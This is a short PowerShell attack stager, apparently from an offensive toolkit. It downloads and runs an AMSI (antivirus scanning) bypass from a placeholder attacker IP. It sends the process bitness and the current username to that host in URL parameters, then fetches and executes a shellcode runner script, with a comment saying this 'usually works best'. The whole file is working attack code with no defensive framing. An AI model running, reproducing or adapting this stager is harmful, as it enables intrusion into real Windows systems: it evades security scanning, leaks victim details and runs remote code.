
#powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.x.x/runall.ps1')


$ip = '192.168.x.x'

#amsi bypass
iex (New-Object Net.WebClient).DownloadString("http://$ip/1.txt")
iex (New-Object Net.WebClient).DownloadString("http://$ip/2.txt")
$is64ps = [Environment]::Is64BitProcess
iex (New-Object Net.WebClient).DownloadString("http://$ip/is64ps=$is64ps")
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
iex (New-Object Net.WebClient).DownloadString("http://$ip/username=$user")
#iex (New-Object Net.WebClient).DownloadString("http://$ip/basicrunner.ps1")
#Usually works best:
iex (New-Object Net.WebClient).DownloadString("http://$ip/shellcoderunner.ps1")
